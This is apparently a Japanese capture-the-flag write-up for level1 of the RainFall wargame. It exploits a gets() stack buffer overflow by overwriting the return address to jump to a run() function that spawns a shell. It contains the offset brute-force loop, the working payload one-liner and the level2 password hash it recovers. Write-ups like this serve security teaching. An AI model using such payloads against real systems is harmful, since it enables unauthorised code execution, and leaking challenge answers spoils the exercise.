# level1

## 方針
ディスアセンブルした`source.c`から、main関数が`gets`を使用していることを確認する。
getsは入力サイズを制限できないため、バッファオーバーフローが発生する。
これによりリターンアドレスを上書きし、run関数の呼び出す。

### runのアドレスを調べる
```
level1@RainFall:~$ gdb ./level1
(gdb) disassemble run
Dump of assembler code for function run:
   0x08048444 <+0>:     push   %ebp
```

### disass main
```
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048480 <+0>:     push   %ebp
   0x08048481 <+1>:     mov    %esp,%ebp
   0x08048483 <+3>:     and    $0xfffffff0,%esp
   0x08048486 <+6>:     sub    $0x50,%esp
   0x08048489 <+9>:     lea    0x10(%esp),%eax //配列のサイズ[64]
   0x0804848d <+13>:    mov    %eax,(%esp)
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave
   0x08048496 <+22>:    ret
End of assembler dump.
```

8048444へジャンプするようにリターンアドレスを書き換える.
リトルエンディアンだから下位バイトを下位アドレスにする.
and    $0xfffffff0,%esp 16バイトアライメントしてるから正確なoffsetは不明だからループにする.


下記からオフセットが76なのがわかる
```
for i in $(seq 70 100); do echo $i; python -c "import sys; sys.stdout.write('A'* $i + '\x44\x84\x04\x08')" | ./level1 && break; done

70
71
72
Illegal instruction (core dumped)
73
Illegal instruction (core dumped)
74
Segmentation fault (core dumped)
75
Segmentation fault (core dumped)
76
Good... Wait what?
```

`python -c "..." | ./level1`だけだと、
pythonがペイロードを出力してすぐ終了するため、
パイプがcloseされ、./level1側の標準入力も閉じられてしまう
これを防ぐために、catを後ろに付けて標準入力を開いたまま維持する

### ans
```
level1@RainFall:~$ (python -c "import sys; sys.stdout.write('A' * 76 + '\x44\x84\x04\x08')" ; cat) | ./level1
a
Good... Wait what?
pwd
/home/user/level1
cd /home/user/level2
cat .pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

## memo

### os 32bit
```
uname -m
i686
```
出力が i686 や i386 → 32bit



```
disassemble main
disassemble run
```

```
+-------------------+
| 呼び出し元のstack |
+-------------------+
| 戻りアドレス      |  <- `EIP` (呼び出し元の `call func'の次の命令)
+-------------------+
| 保存されたEBP     |  <- `EBP` (呼び出し元の `EBP`)
+-------------------+  <- `EBP`
| ローカル変数      |
+-------------------+  <- `ESP`

```